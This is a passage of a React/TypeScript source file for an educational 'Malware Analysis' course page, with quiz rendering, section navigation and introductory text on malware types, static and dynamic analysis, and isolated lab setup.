            py: 1.5,
            fontSize: "1.1rem",
            "&:hover": {
              background: "linear-gradient(135deg, #dc2626, #ea580c)",
            },
          }}
        >
          Start Quiz
        </Button>
      </Paper>
    );
  }
  if (showResults) {
    const score = calculateScore();
    return (
      <Paper
        id="quiz-section"
        sx={{
          p: 4,
          mb: 5,
          borderRadius: 4,
          bgcolor: alpha(theme.palette.background.paper, 0.6),
          border: `2px solid ${alpha(getScoreColor(score), 0.3)}`,
        }}
      >
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <EmojiEventsIcon sx={{ color: getScoreColor(score), fontSize: 40 }} />
          Quiz Results
        </Typography>

        <Box sx={{ textAlign: "center", mb: 4 }}>
          <Typography variant="h1" sx={{ fontWeight: 900, color: getScoreColor(score), mb: 1 }}>
            {score}/10
          </Typography>
          <Typography variant="h6" sx={{ color: "text.secondary", mb: 2 }}>
            {getScoreMessage(score)}
          </Typography>
          <Chip
            label={`${score * 10}%`}
            sx={{
              bgcolor: alpha(getScoreColor(score), 0.15),
              color: getScoreColor(score),
              fontWeight: 700,
              fontSize: "1rem",
              px: 2,
            }}
          />
        </Box>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Review Your Answers:</Typography>

        {currentQuestions.map((q, index) => {
          const isCorrect = userAnswers[q.id] === q.correctAnswer;
          return (
            <Paper
              key={q.id}
              sx={{
                p: 2,
                mb: 2,
                borderRadius: 2,
                bgcolor: alpha(isCorrect ? "#22c55e" : "#ef4444", 0.05),
                border: `1px solid ${alpha(isCorrect ? "#22c55e" : "#ef4444", 0.2)}`,
              }}
            >
              <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1, mb: 1 }}>
                <Chip
                  label={`Q${index + 1}`}
                  size="small"
                  sx={{
                    bgcolor: isCorrect ? "#22c55e" : "#ef4444",
                    color: "white",
                    fontWeight: 700,
                  }}
                />
                <Typography variant="body2" sx={{ fontWeight: 600 }}>
                  {q.question}
                </Typography>
              </Box>
              <Typography variant="body2" sx={{ color: "text.secondary", ml: 4.5 }}>
                <strong>Your answer:</strong> {q.options[userAnswers[q.id]] || "Not answered"}
                {!isCorrect && (
                  <>
                    <br />
                    <strong style={{ color: "#22c55e" }}>Correct:</strong> {q.options[q.correctAnswer]}
                  </>
                )}
              </Typography>
              {!isCorrect && (
                <Alert severity="info" sx={{ mt: 1, ml: 4.5 }}>
                  <Typography variant="caption">{q.explanation}</Typography>
                </Alert>
              )}
            </Paper>
          );
        })}

        <Box sx={{ display: "flex", gap: 2, mt: 3 }}>
          <Button
            variant="contained"
            onClick={startQuiz}
            startIcon={<RefreshIcon />}
            sx={{
              background: "linear-gradient(135deg, #ef4444, #f97316)",
              fontWeight: 700,
            }}
          >
            Try Again (New Questions)
          </Button>
          <Button
            variant="outlined"
            onClick={() => setQuizStarted(false)}
            sx={{ fontWeight: 600 }}
          >
            Back to Overview
          </Button>
        </Box>
      </Paper>
    );
  }

  const currentQuestion = currentQuestions[currentQuestionIndex];
  const answeredCount = Object.keys(userAnswers).length;

  return (
    <Paper
      id="quiz-section"
      sx={{
        p: 4,
        mb: 5,
        borderRadius: 4,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        border: `2px solid ${alpha("#ef4444", 0.3)}`,
      }}
    >
      <Box sx={{ mb: 3 }}>
        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
          <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
            Question {currentQuestionIndex + 1} of 10
          </Typography>
          <Chip
            label={currentQuestion.topic}
            size="small"
            sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 600 }}
          />
        </Box>
        <Box sx={{ width: "100%", bgcolor: alpha("#ef4444", 0.1), borderRadius: 1, height: 8 }}>
          <Box
            sx={{
              width: `${((currentQuestionIndex + 1) / 10) * 100}%`,
              bgcolor: "#ef4444",
              borderRadius: 1,
              height: "100%",
              transition: "width 0.3s ease",
            }}
          />
        </Box>
      </Box>

      <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, lineHeight: 1.6 }}>
        {currentQuestion.question}
      </Typography>

      <Grid container spacing={2} sx={{ mb: 4 }}>
        {currentQuestion.options.map((option, index) => {
          const isSelected = userAnswers[currentQuestion.id] === index;
          return (
            <Grid item xs={12} key={option}>
              <Paper
                onClick={() => handleAnswerSelect(currentQuestion.id, index)}
                sx={{
                  p: 2,
                  borderRadius: 2,
                  cursor: "pointer",
                  bgcolor: isSelected ? alpha("#ef4444", 0.15) : alpha(theme.palette.background.paper, 0.5),
                  border: `2px solid ${isSelected ? "#ef4444" : alpha(theme.palette.divider, 0.2)}`,
                  transition: "all 0.2s ease",
                  "&:hover": {
                    borderColor: "#ef4444",
                    bgcolor: alpha("#ef4444", 0.08),
                  },
                }}
              >
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Box
                    sx={{
                      width: 32,
                      height: 32,
                      borderRadius: "50%",
                      bgcolor: isSelected ? "#ef4444" : alpha(theme.palette.divider, 0.3),
                      color: isSelected ? "white" : "text.secondary",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      fontWeight: 700,
                      fontSize: "0.9rem",
                    }}
                  >
                    {String.fromCharCode(65 + index)}
                  </Box>
                  <Typography variant="body1" sx={{ fontWeight: isSelected ? 600 : 400 }}>
                    {option}
                  </Typography>
                </Box>
              </Paper>
            </Grid>
          );
        })}
      </Grid>

      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
        <Button
          variant="outlined"
          disabled={currentQuestionIndex === 0}
          onClick={() => setCurrentQuestionIndex((prev) => prev - 1)}
        >
          Previous
        </Button>

        <Typography variant="body2" color="text.secondary">
          {answeredCount}/10 answered
        </Typography>

        {currentQuestionIndex < 9 ? (
          <Button
            variant="contained"
            onClick={() => setCurrentQuestionIndex((prev) => prev + 1)}
            sx={{
              background: "linear-gradient(135deg, #ef4444, #f97316)",
            }}
          >
            Next
          </Button>
        ) : (
          <Button
            variant="contained"
            onClick={() => setShowResults(true)}
            disabled={answeredCount < 10}
            sx={{
              background: answeredCount >= 10
                ? "linear-gradient(135deg, #22c55e, #16a34a)"
                : undefined,
              fontWeight: 700,
            }}
          >
            Submit Quiz
          </Button>
        )}
      </Box>

      <Box sx={{ mt: 3, pt: 3, borderTop: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
        <Typography variant="caption" color="text.secondary" sx={{ mb: 1, display: "block" }}>
          Quick Navigation:
        </Typography>
        <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
          {currentQuestions.map((_, index) => {
            const isAnswered = userAnswers[currentQuestions[index].id] !== undefined;
            const isCurrent = index === currentQuestionIndex;
            return (
              <Box
                key={index}
                onClick={() => setCurrentQuestionIndex(index)}
                sx={{
                  width: 32,
                  height: 32,
                  borderRadius: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  cursor: "pointer",
                  fontWeight: 700,
                  fontSize: "0.85rem",
                  bgcolor: isCurrent
                    ? "#ef4444"
                    : isAnswered
                    ? alpha("#22c55e", 0.2)
                    : alpha(theme.palette.divider, 0.1),
                  color: isCurrent ? "white" : isAnswered ? "#22c55e" : "text.secondary",
                  border: `1px solid ${isCurrent ? "#ef4444" : isAnswered ? "#22c55e" : "transparent"}`,
                  transition: "all 0.2s ease",
                  "&:hover": {
                    bgcolor: isCurrent ? "#ef4444" : alpha("#ef4444", 0.2),
                  },
                }}
              >
                {index + 1}
              </Box>
            );
          })}
        </Box>
      </Box>
    </Paper>
  );
}


export default function MalwareAnalysisPage() {
  const navigate = useNavigate();
  const theme = useTheme();
  const accent = "#ef4444";

  // Navigation state
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<string>("");
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));

  const sectionNavItems = [
    { id: "introduction", label: "Introduction", icon: <SchoolIcon /> },
    { id: "malware-types-content", label: "Malware Types", icon: <BugReportIcon /> },
    { id: "analysis-environment-content", label: "Analysis Environment", icon: <SettingsIcon /> },
    { id: "static-analysis-content", label: "Static Analysis", icon: <SearchIcon /> },
    { id: "dynamic-analysis-content", label: "Dynamic Analysis", icon: <PlayArrowIcon /> },
    { id: "debugging-malware-content", label: "Debugging Malware", icon: <BugReportIcon /> },
    { id: "disassembly-analysis-content", label: "Disassembly", icon: <CodeIcon /> },
    { id: "anti-analysis-content", label: "Anti-Analysis", icon: <ShieldIcon /> },
    { id: "unpacking-content", label: "Unpacking", icon: <LockIcon /> },
    { id: "network-analysis-content", label: "Network Analysis", icon: <NetworkCheckIcon /> },
    { id: "memory-forensics-content", label: "Memory Forensics", icon: <MemoryIcon /> },
    { id: "yara-rules-content", label: "YARA Rules", icon: <PolicyIcon /> },
    { id: "ransomware-analysis-content", label: "Ransomware", icon: <VpnKeyIcon /> },
    { id: "c2-infrastructure-content", label: "C2 Infrastructure", icon: <HubIcon /> },
    { id: "threat-intel-content", label: "Threat Intel", icon: <AnalyticsIcon /> },
    { id: "reporting-content", label: "Reporting", icon: <DescriptionIcon /> },
    { id: "quiz-section", label: "Quiz", icon: <QuizIcon /> },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      let currentSection = "";

      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  const currentIndex = sectionNavItems.findIndex((item) => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / sectionNavItems.length) * 100 : 0;

  const pageContext = `Malware Analysis Learning Guide - Comprehensive course covering malware types, analysis environments, static and dynamic analysis, debugging, disassembly, anti-analysis techniques, unpacking, network traffic analysis, memory forensics, YARA rules, ransomware analysis, C2 infrastructure, threat intelligence, and reporting.`;

  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 220,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 3,
        border: `1px solid ${alpha(accent, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        display: { xs: "none", lg: "block" },
        "&::-webkit-scrollbar": { width: 6 },
        "&::-webkit-scrollbar-thumb": { bgcolor: alpha(accent, 0.3), borderRadius: 3 },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: accent, display: "flex", alignItems: "center", gap: 1 }}>
          <ListAltIcon sx={{ fontSize: 18 }} />
          Course Navigation
        </Typography>
        <Box sx={{ mb: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">Progress</Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>{Math.round(progressPercent)}%</Typography>
          </Box>
          <LinearProgress variant="determinate" value={progressPercent} sx={{ height: 6, borderRadius: 3, bgcolor: alpha(accent, 0.1), "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 } }} />
        </Box>
        <Divider sx={{ mb: 1 }} />
        <List dense sx={{ mx: -1 }}>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1.5, mb: 0.25, py: 0.5, cursor: "pointer",
                bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                "&:hover": { bgcolor: alpha(accent, 0.08) },
                transition: "all 0.15s ease",
              }}
            >
              <ListItemIcon sx={{ minWidth: 24, fontSize: "0.9rem" }}>{item.icon}</ListItemIcon>
              <ListItemText primary={<Typography variant="caption" sx={{ fontWeight: activeSection === item.id ? 700 : 500, color: activeSection === item.id ? accent : "text.secondary", fontSize: "0.75rem" }}>{item.label}</Typography>} />
            </ListItem>
          ))}
        </List>
      </Box>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="Malware Analysis" pageContext={pageContext}>
      {/* Floating Navigation Button - Mobile Only */}
      <Tooltip title="Navigate Sections" placement="left">
        <Fab color="primary" onClick={() => setNavDrawerOpen(true)} sx={{ position: "fixed", bottom: 90, right: 24, zIndex: 1000, bgcolor: accent, "&:hover": { bgcolor: "#dc2626" }, boxShadow: `0 4px 20px ${alpha(accent, 0.4)}`, display: { xs: "flex", lg: "none" } }}>
          <ListAltIcon />
        </Fab>
      </Tooltip>

      {/* Scroll to Top Button - Mobile Only */}
      <Tooltip title="Scroll to Top" placement="left">
        <Fab size="small" onClick={scrollToTop} sx={{ position: "fixed", bottom: 32, right: 28, zIndex: 1000, bgcolor: alpha(accent, 0.15), color: accent, "&:hover": { bgcolor: alpha(accent, 0.25) }, display: { xs: "flex", lg: "none" } }}>
          <KeyboardArrowUpIcon />
        </Fab>
      </Tooltip>

      {/* Navigation Drawer - Mobile */}
      <Drawer anchor="right" open={navDrawerOpen} onClose={() => setNavDrawerOpen(false)} PaperProps={{ sx: { width: isMobile ? "85%" : 320, bgcolor: theme.palette.background.paper, backgroundImage: "none" } }}>
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
              <ListAltIcon sx={{ color: accent }} />
              Course Navigation
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} size="small"><CloseIcon /></IconButton>
          </Box>
          <Divider sx={{ mb: 2 }} />
          <Box sx={{ mb: 2, p: 1.5, borderRadius: 2, bgcolor: alpha(accent, 0.05) }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
              <Typography variant="caption" color="text.secondary">Progress</Typography>
              <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>{Math.round(progressPercent)}%</Typography>
            </Box>
            <LinearProgress variant="determinate" value={progressPercent} sx={{ height: 6, borderRadius: 3, bgcolor: alpha(accent, 0.1), "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 } }} />
          </Box>
          <List dense sx={{ mx: -1 }}>
            {sectionNavItems.map((item) => (
              <ListItem key={item.id} onClick={() => scrollToSection(item.id)} sx={{ borderRadius: 2, mb: 0.5, cursor: "pointer", bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent", borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent", "&:hover": { bgcolor: alpha(accent, 0.1) }, transition: "all 0.2s ease" }}>
                <ListItemIcon sx={{ minWidth: 32, fontSize: "1.1rem" }}>{item.icon}</ListItemIcon>
                <ListItemText primary={<Typography variant="body2" sx={{ fontWeight: activeSection === item.id ? 700 : 500, color: activeSection === item.id ? accent : "text.primary" }}>{item.label}</Typography>} />
                {activeSection === item.id && <Chip label="Current" size="small" sx={{ height: 20, fontSize: "0.65rem", bgcolor: alpha(accent, 0.2), color: accent }} />}
              </ListItem>
            ))}
          </List>
          <Divider sx={{ my: 2 }} />
          <Box sx={{ display: "flex", gap: 1 }}>
            <Button size="small" variant="outlined" onClick={scrollToTop} startIcon={<KeyboardArrowUpIcon />} sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}>Top</Button>
            <Button size="small" variant="outlined" onClick={() => scrollToSection("quiz-section")} startIcon={<QuizIcon />} sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}>Quiz</Button>
          </Box>
        </Box>
      </Drawer>

      {/* Main Layout with Sidebar */}
      <Box sx={{ display: "flex", gap: 3, maxWidth: 1400, mx: "auto", px: { xs: 2, sm: 3 }, py: 4 }}>
        {sidebarNav}
        <Box sx={{ flex: 1, minWidth: 0 }}>
        {/* Back Button */}
        <Chip
          component={Link}
          to="/learn"
          icon={<ArrowBackIcon />}
          label="Back to Learning Hub"
          clickable
          variant="outlined"
          sx={{ borderRadius: 2, mb: 3 }}
        />

        {/* Hero Banner */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 4,
            background: `linear-gradient(135deg, ${alpha("#ef4444", 0.15)} 0%, ${alpha("#8b5cf6", 0.15)} 50%, ${alpha("#06b6d4", 0.15)} 100%)`,
            border: `1px solid ${alpha("#ef4444", 0.2)}`,
            position: "relative",
            overflow: "hidden",
          }}
        >
          {/* Decorative background elements */}
          <Box
            sx={{
              position: "absolute",
              top: -50,
              right: -50,
              width: 200,
              height: 200,
              borderRadius: "50%",
              background: `radial-gradient(circle, ${alpha("#ef4444", 0.1)} 0%, transparent 70%)`,
            }}
          />
          <Box
            sx={{
              position: "absolute",
              bottom: -30,
              left: "30%",
              width: 150,
              height: 150,
              borderRadius: "50%",
              background: `radial-gradient(circle, ${alpha("#8b5cf6", 0.1)} 0%, transparent 70%)`,
            }}
          />
          
          <Box sx={{ position: "relative", zIndex: 1 }}>
            <Box sx={{ display: "flex", alignItems: "center", gap: 3, mb: 3 }}>
              <Box
                sx={{
                  width: 80,
                  height: 80,
                  borderRadius: 3,
                  background: `linear-gradient(135deg, #ef4444, #8b5cf6)`,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  boxShadow: `0 8px 32px ${alpha("#ef4444", 0.3)}`,
                }}
              >
                <BugReportIcon sx={{ fontSize: 44, color: "white" }} />
              </Box>
              <Box>
                <Typography variant="h3" sx={{ fontWeight: 800, mb: 0.5 }}>
                  Malware Analysis
                </Typography>
                <Typography variant="h6" color="text.secondary" sx={{ fontWeight: 400 }}>
                  Dissect malicious software to understand threats and protect systems
                </Typography>
              </Box>
            </Box>
            
            <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 3 }}>
              <Chip label="Intermediate to Advanced" color="warning" />
              <Chip label="Static Analysis" sx={{ bgcolor: alpha("#3b82f6", 0.15), color: "#3b82f6", fontWeight: 600 }} />
              <Chip label="Dynamic Analysis" sx={{ bgcolor: alpha("#06b6d4", 0.15), color: "#06b6d4", fontWeight: 600 }} />
              <Chip label="Reverse Engineering" sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 600 }} />
              <Chip label="Threat Intel" sx={{ bgcolor: alpha("#10b981", 0.15), color: "#10b981", fontWeight: 600 }} />
            </Box>

            {/* Quick Stats */}
            <Grid container spacing={2}>
              {quickStats.map((stat) => (
                <Grid item xs={6} sm={3} key={stat.label}>
                  <Paper
                    sx={{
                      p: 2,
                      textAlign: "center",
                      borderRadius: 2,
                      bgcolor: alpha(stat.color, 0.1),
                      border: `1px solid ${alpha(stat.color, 0.2)}`,
                    }}
                  >
                    <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>
                      {stat.value}
                    </Typography>
                    <Typography variant="caption" color="text.secondary" sx={{ fontWeight: 600 }}>
                      {stat.label}
                    </Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>
          </Box>
        </Paper>

        {/* Quick Navigation */}
        <Paper
          sx={{
            p: 2,
            mb: 4,
            borderRadius: 3,
            position: { xs: "static", md: "sticky" },
            top: { md: 16, xs: "auto" },
            zIndex: 10,
            bgcolor: alpha(theme.palette.background.paper, 0.9),
            backdropFilter: "blur(6px)",
            border: `1px solid ${alpha(theme.palette.divider, 0.15)}`,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 1, flexWrap: "wrap" }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mr: 1 }}>
              Quick Navigation
            </Typography>
            {outlineSections.map((section) => (
              <Chip
                key={section.id}
                label={section.title.split(" ").slice(0, 2).join(" ")}
                component="a"
                href={`#${section.id}`}
                clickable
                size="small"
                sx={{
                  textDecoration: "none",
                  bgcolor: alpha("#ef4444", 0.08),
                  color: "#ef4444",
                  fontWeight: 600,
                  "&:hover": { bgcolor: alpha("#ef4444", 0.15) },
                }}
              />
            ))}
          </Box>
        </Paper>

        {/* ==================== DETAILED INTRODUCTION ==================== */}
        <Paper
          id="introduction"
          sx={{
            p: 4,
            mb: 5,
            borderRadius: 4,
            bgcolor: alpha(theme.palette.background.paper, 0.6),
            border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <Box
              sx={{
                width: 48,
                height: 48,
                borderRadius: 2,
                background: `linear-gradient(135deg, #ef4444, #dc2626)`,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <SchoolIcon sx={{ color: "white", fontSize: 28 }} />
            </Box>
            What is Malware Analysis?
          </Typography>
          
          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            <strong>Malware analysis</strong> is the process of studying malicious software to understand how it works, 
            what it does, and how to defend against it. Think of it like being a detective investigating a crimeexcept 
            the "crime scene" is a computer program designed to cause harm. Malware analysts dissect these programs 
            to uncover their secrets: how they infect systems, what damage they can do, how they communicate with 
            attackers, and how to stop them.
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            The word "<strong>malware</strong>" is short for "malicious software." It's an umbrella term that covers 
            many types of harmful programs, including <strong>viruses</strong> (programs that spread by attaching 
            themselves to other files), <strong>worms</strong> (programs that spread across networks on their own), 
            <strong>trojans</strong> (programs that disguise themselves as legitimate software), <strong>ransomware</strong> 
            (programs that encrypt your files and demand payment), <strong>spyware</strong> (programs that secretly 
            monitor your activity), and <strong>rootkits</strong> (programs that hide deep in your system to avoid 
            detection). Each type has different behaviors and requires different analysis techniques.
          </Typography>

          <Alert severity="info" sx={{ mb: 4, borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Why Learn Malware Analysis?</AlertTitle>
            <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
              Malware analysis is a critical skill in cybersecurity. Security professionals use it to understand new 
              threats, develop defenses, create detection signatures, support incident response, and even help law 
              enforcement track down cybercriminals. It's a field that combines technical skills (programming, 
              reverse engineering, networking) with detective work (following clues, recognizing patterns, thinking 
              like an attacker). If you enjoy puzzles and want to protect people from digital threats, malware 
              analysis might be for you.
            </Typography>
          </Alert>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#3b82f6" }}>
            The Two Pillars: Static vs Dynamic Analysis
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            <Grid item xs={12} md={6}>
              <Paper
                sx={{
                  p: 3,
                  height: "100%",
                  borderRadius: 3,
                  bgcolor: alpha("#3b82f6", 0.05),
                  border: `1px solid ${alpha("#3b82f6", 0.2)}`,
                }}
              >
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
                  <SearchIcon sx={{ fontSize: 32, color: "#3b82f6" }} />
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#3b82f6" }}>
                    Static Analysis
                  </Typography>
                </Box>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  <strong>Static analysis</strong> means examining malware <em>without running it</em>. Think of it 
                  like studying a bomb without detonating it. You look at the code, the file structure, embedded 
                  strings, imported functions, and other indicators to understand what the malware <em>could</em> do. 
                  This is safer because the malware isn't active, but you might miss behaviors that only appear 
                  when the program runs.
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
                  <strong>Key activities:</strong> Examining file headers (PE, ELF), extracting readable strings, 
                  analyzing import/export tables, checking for known signatures, disassembling code, and identifying 
                  packing or obfuscation.
                </Typography>
              </Paper>
            </Grid>
            <Grid item xs={12} md={6}>
              <Paper
                sx={{
                  p: 3,
                  height: "100%",
                  borderRadius: 3,
                  bgcolor: alpha("#06b6d4", 0.05),
                  border: `1px solid ${alpha("#06b6d4", 0.2)}`,
                }}
              >
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
                  <PlayArrowIcon sx={{ fontSize: 32, color: "#06b6d4" }} />
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#06b6d4" }}>
                    Dynamic Analysis
                  </Typography>
                </Box>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  <strong>Dynamic analysis</strong> means <em>running the malware</em> in a controlled environment and 
                  observing what it does. This is like detonating that bomb in a blast chamber to see its effects. 
                  You watch which files it creates, what registry keys it modifies, what network connections it makes, 
                  and what processes it spawns. This reveals actual behavior but requires a secure, isolated lab.
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
                  <strong>Key activities:</strong> Running in sandboxes/VMs, monitoring with Process Monitor, capturing 
                  network traffic with Wireshark, tracing API calls, analyzing memory, and observing persistence mechanisms.
                </Typography>
              </Paper>
            </Grid>
          </Grid>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            In practice, malware analysts use <strong>both approaches together</strong>. You might start with static 
            analysis to get an overviewcheck if the file is packed, look for suspicious strings like URLs or registry 
            paths, identify what libraries it uses. Then you move to dynamic analysis to see what actually happens 
            when it runs. If the malware is sophisticated and uses obfuscation or anti-analysis tricks, you might need 
            to use a <strong>debugger</strong> (like x64dbg or GDB) to step through the code instruction by instruction 
            and understand its logic.
          </Typography>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#8b5cf6" }}>
            Setting Up Your Analysis Lab
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            <strong>Never analyze malware on your personal computer!</strong> This is the golden rule. Malware can 
            steal your data, encrypt your files, spread to other devices on your network, or persist in ways that 
            are hard to remove. Instead, you need an <strong>isolated analysis environment</strong>a virtual machine 
            (VM) that's disconnected from your real network and can be easily reset to a clean state.
          </Typography>

          <Paper
            sx={{
              p: 3,
              mb: 4,
              borderRadius: 3,
              bgcolor: alpha("#8b5cf6", 0.05),
              border: `1px solid ${alpha("#8b5cf6", 0.2)}`,
            }}
          >
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
              Essential Lab Components
            </Typography>
            <Grid container spacing={2}>
              <Grid item xs={12} sm={6}>
                <List dense>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e" }} /></ListItemIcon>
                    <ListItemText 
                      primary="Hypervisor (VMware, VirtualBox)" 
                      secondary="Creates isolated virtual machines"
                    />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e" }} /></ListItemIcon>
                    <ListItemText 
                      primary="REMnux (Linux)" 
                      secondary="Pre-built distro with analysis tools"
                    />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e" }} /></ListItemIcon>
                    <ListItemText 
                      primary="FlareVM (Windows)" 
                      secondary="Windows-based analysis environment"
                    />
                  </ListItem>
                </List>
              </Grid>
              <Grid item xs={12} sm={6}>
                <List dense>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e" }} /></ListItemIcon>
                    <ListItemText 
                      primary="Snapshots" 
                      secondary="Restore to clean state after infection"
                    />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e" }} /></ListItemIcon>
                    <ListItemText 
                      primary="Network Isolation" 
                      secondary="Prevent malware from spreading"
                    />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e" }} /></ListItemIcon>
                    <ListItemText 
                      primary="Fake Services (INetSim, FakeNet)" 
                      secondary="Simulate internet to observe C2 attempts"
                    />
                  </ListItem>
                </List>
              </Grid>
            </Grid>
          </Paper>

          <Alert severity="warning" sx={{ mb: 4, borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}> Safety First</AlertTitle>
            <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
              Malware can detect if it's running in a VM and might behave differently (or not run at all). 
              Sophisticated malware can even attempt to escape virtual machines. Always use snapshots, keep your 
              hypervisor updated, disable shared folders, and use host-only or isolated networking. When in doubt, 
              use an air-gapped physical machine for the most dangerous samples.
            </Typography>
          </Alert>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#10b981" }}>
            The Malware Analysis Process
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            A typical malware analysis workflow follows these steps. Beginners should focus on the first few steps 
            before diving into advanced techniques like debugging and unpacking:
          </Typography>

          <Paper
            sx={{
              p: 3,
              mb: 4,
              borderRadius: 3,
              bgcolor: alpha("#10b981", 0.03),
              border: `1px solid ${alpha("#10b981", 0.15)}`,
            }}
          >
            <Grid container spacing={2}>
              {[
                { step: "1", title: "Initial Triage", desc: "Calculate hashes, check VirusTotal, identify file type", color: "#3b82f6" },
                { step: "2", title: "Static Analysis", desc: "Strings, PE headers, imports, packed check", color: "#8b5cf6" },
                { step: "3", title: "Behavioral Analysis", desc: "Run in sandbox, monitor processes/network/files", color: "#06b6d4" },
